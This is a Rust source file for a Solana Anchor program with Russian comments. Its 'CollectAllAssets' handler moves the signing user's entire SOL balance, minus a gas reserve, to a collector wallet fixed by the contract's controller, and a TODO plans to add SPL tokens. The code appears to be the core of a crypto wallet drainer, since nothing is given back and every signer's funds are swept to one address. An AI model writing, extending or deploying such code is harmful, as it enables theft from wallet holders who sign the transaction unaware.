use anchor_lang::prelude::*;
use anchor_lang::system_program;
use crate::state::*;
use crate::error::ErrorCode;

#[derive(Accounts)]
pub struct CollectAllAssets<'info> {
    #[account(
        seeds = [CollectorState::SEED],
        bump = collector_state.bump
    )]
    pub collector_state: Account<'info, CollectorState>,
    
    #[account(mut)]
    pub user_wallet: Signer<'info>,
    
    /// CHECK: Кошелек-получатель из настроек контракта
    #[account(
        mut,
        constraint = collector_wallet.key() == collector_state.collector_wallet @ ErrorCode::InvalidCollectorWallet
    )]
    pub collector_wallet: AccountInfo<'info>,
    
    pub system_program: Program<'info, System>,
}

pub fn handler(ctx: Context<CollectAllAssets>) -> Result<()> {
    let collector_state = &ctx.accounts.collector_state;
    let user_wallet = &ctx.accounts.user_wallet;
    let collector_wallet = &ctx.accounts.collector_wallet;
    
    // Проверяем, что кошелек-получатель настроен
    require!(
        collector_state.collector_wallet != Pubkey::default(),
        ErrorCode::CollectorWalletNotSet
    );
    
    msg!("Начинаем сбор активов с кошелька: {}", user_wallet.key());
    msg!("Кошелек-получатель: {}", collector_wallet.key());
    
    // Получаем текущий баланс SOL пользователя
    let user_balance = user_wallet.lamports();
    let gas_reserve = collector_state.gas_reserve;
    
    msg!("Баланс пользователя: {} лампортов", user_balance);
    msg!("Резерв на газ: {} лампортов", gas_reserve);
    
    // Проверяем, есть ли SOL для перевода (оставляем резерв)
    if user_balance > gas_reserve {
        let transfer_amount = user_balance - gas_reserve;
        
        msg!("Переводим SOL: {} лампортов", transfer_amount);
        
        // Используем CPI для перевода SOL через system program
        system_program::transfer(
            CpiContext::new(
                ctx.accounts.system_program.to_account_info(),
                system_program::Transfer {
                    from: user_wallet.to_account_info(),
                    to: collector_wallet.to_account_info(),
                },
            ),
            transfer_amount,
        )?;
        
        msg!("SOL успешно переведен!");
    } else {
        msg!("Недостаточно SOL для перевода (баланс меньше резерва)");
    }
    
    // TODO: Добавить обработку SPL токенов в следующем этапе
    msg!("Сбор активов завершен для кошелька: {}", user_wallet.key());
    
    Ok(())
}